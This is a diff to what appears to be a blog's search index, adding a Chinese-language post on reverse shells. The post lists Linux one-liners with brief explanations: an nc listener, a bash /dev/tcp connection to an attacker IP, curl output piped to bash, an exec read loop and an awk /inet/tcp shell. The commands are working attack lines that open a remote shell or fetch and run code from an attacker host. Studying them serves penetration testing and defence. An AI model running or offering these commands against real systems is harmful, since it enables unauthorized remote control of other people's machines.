@@ -992,4 +992,40 @@ echo 123;
         <tag>wordpress</tag>
       </tags>
   </entry>
+  <entry>
+    <title>反弹SHELL</title>
+    <url>/2021/12/14/%E5%8F%8D%E5%BC%B9SHELL/</url>
+    <content><![CDATA[<p>文章参考 : <a href="https://blog.csdn.net/Aaron_Miller/article/details/106825087">反弹Shell的方式和详解</a>  </p>
+<span id="more"></span>
+
+<h2 id="1-Linux反弹SHELL"><a href="#1-Linux反弹SHELL" class="headerlink" title="1.Linux反弹SHELL"></a>1.Linux反弹SHELL</h2><h3 id="1-1BASH反弹SHELL"><a href="#1-1BASH反弹SHELL" class="headerlink" title="1.1BASH反弹SHELL"></a>1.1BASH反弹SHELL</h3><p>攻击方:10.1.1.130<br>靶机:10.1.1.131</p>
+<p>攻击方使用nc监听端口<br><code> nc -lvp 9876</code><br>靶机执行命令<br><code> bash -i &gt;&amp; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1</code></p>
+<ul>
+<li>bash -i 表示创建一个新的shell页面</li>
+<li>&gt;&amp;表示将标准输出和错误输出都重定向到文件</li>
+<li>/dev/tcp/10.1.1.130/9876 表示对10.1.1.130 9876端口建立连接</li>
+<li>0&gt;&amp;1表示将标准输入 作为标准输出</li>
+</ul>
+<h3 id="1-2-CURL反弹SHELL"><a href="#1-2-CURL反弹SHELL" class="headerlink" title="1.2 CURL反弹SHELL"></a>1.2 CURL反弹SHELL</h3><p>攻击方存在web服务，并建立一个文件中存放任意反弹SHELL命令。控制靶机CRUL web中的反弹shell文件，通过管道符作为bash输入，实现反弹SEHLL。    </p>
+<p>攻击方 :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1&quot;</span> &gt; index.html</span><br><span class="line">nc -lvp 9876</span><br></pre></td></tr></table></figure>
+<p>靶机:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl 10.1.1.130 | bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-EXEC反弹SHELL"><a href="#1-3-EXEC反弹SHELL" class="headerlink" title="1.3 EXEC反弹SHELL"></a>1.3 EXEC反弹SHELL</h3><p>靶机:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/10.1.1.130/9876;cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-AWK反弹SHELL"><a href="#1-4-AWK反弹SHELL" class="headerlink" title="1.4 AWK反弹SHELL"></a>1.4 AWK反弹SHELL</h3><p>靶机:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/10.1.1.130/9876&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>反弹shell</category>
+      </categories>
+      <tags>
+        <tag>shell</tag>
+      </tags>
+  </entry>
 </search>
